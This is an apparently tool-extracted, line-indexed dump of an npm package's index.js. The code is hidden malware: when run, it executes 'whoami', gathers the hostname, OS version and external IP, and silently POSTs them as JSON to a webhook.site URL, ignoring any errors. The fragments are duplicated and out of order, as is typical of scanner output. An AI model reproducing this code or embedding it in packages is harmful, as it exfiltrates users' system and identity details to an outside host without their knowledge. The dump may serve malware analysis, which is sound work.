// File: tmp/tmpjg4faoe3/test-kaks3c/package/index.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const https = require('https')
Line 3: _tmp_1 = require('child_process')
Line 6: const webhookUrl = 'https://webhook.site/42057b0b-734e-4c7e-9755-71e765c659b0'
Line 9: (_tmp_0 = https.get('https://api.ipify.org', (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => callback(data.trim()));
  }))
Line 12: callback(data.trim())
Line 13: callback('unavailable')
Line 16: exec('whoami', (err, whoami) => {
  const hostname = os.hostname();
  const osType = `${os.type()} ${os.release()}`;

  getExternalIP((externalIP) => {
    const payload = JSON.stringify({
      ip: externalIP,
      hostname: hostname,
      os: osType,
      whoami: whoami.trim()
    });

    const data = Buffer.from(payload);

    const req = https.request(
      new URL(webhookUrl),
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': data.length
        }
      },
      (res) => res.on('data', () => {}) // drain response
    );

    req.on('error', () => {});
    req.write(data);
    req.end();
  });
})
Line 17: os.hostname()
Line 18: os.type()
Line 20: {
    const payload = JSON.stringify({
      ip: externalIP,
      hostname: hostname,
      os: osType,
      whoami: whoami.trim()
    });

    const data = Buffer.from(payload);

    const req = https.request(
      new URL(webhookUrl),
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': data.length
        }
      },
      (res) => res.on('data', () => {}) // drain response
    );

    req.on('error', () => {});
    req.write(data);
    req.end();
  }
Line 25: whoami.trim()
Line 28: Buffer.from(payload)
Line 30: const req = https.request(
      new URL(webhookUrl),
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': data.length
        }
      },
      (res) => res.on('data', () => {}) // drain response
    )
Line 43: req.write(data)
Line 44: req.end()
